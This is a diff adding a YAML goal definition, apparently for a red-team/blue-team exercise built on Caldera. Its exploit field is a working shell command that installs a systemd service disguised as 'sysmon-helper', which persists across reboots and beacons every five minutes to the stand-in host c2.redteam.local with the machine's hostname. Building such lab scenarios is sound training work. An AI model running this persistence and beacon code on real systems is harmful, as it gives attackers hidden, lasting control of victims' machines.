@@ -1,0 +1,50 @@
+id: install_c2
+name: Install C2 Beacon
+description: Install a persistent command-and-control beacon that survives reboots, demonstrating full compromise of the target system.
+type: goal
+difficulty: hard
+points: 0
+red_points: 500
+defend_points: 350
+category: command-and-control
+tags: [c2, persistence, command-and-control]
+conflicts: []
+requires: []
+
+caldera:
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: "Remote Access Software"
+  exploit:
+    description: "Install a persistent beacon via systemd service"
+    command: |
+      cat > /tmp/beacon.sh << 'BEACON'
+      #!/bin/bash
+      while true; do
+        curl -sk http://c2.redteam.local/beacon?host=$(hostname) || true
+        sleep 300
+      done
+      BEACON
+      chmod +x /tmp/beacon.sh
+      cat > /etc/systemd/system/sysmon-helper.service << 'SVC'
+      [Unit]
+      Description=System Monitor Helper
+      After=network.target
+      [Service]
+      ExecStart=/tmp/beacon.sh
+      Restart=always
+      [Install]
+      WantedBy=multi-user.target
+      SVC
+      systemctl daemon-reload && systemctl enable sysmon-helper && systemctl start sysmon-helper && echo "GOAL_ACHIEVED: c2 beacon installed"
+
+verification:
+  type: service_running
+  service: sysmon-helper
+  expected: active
+
+revert_verification:
+  type: service_running
+  service: sysmon-helper
+  expected: inactive
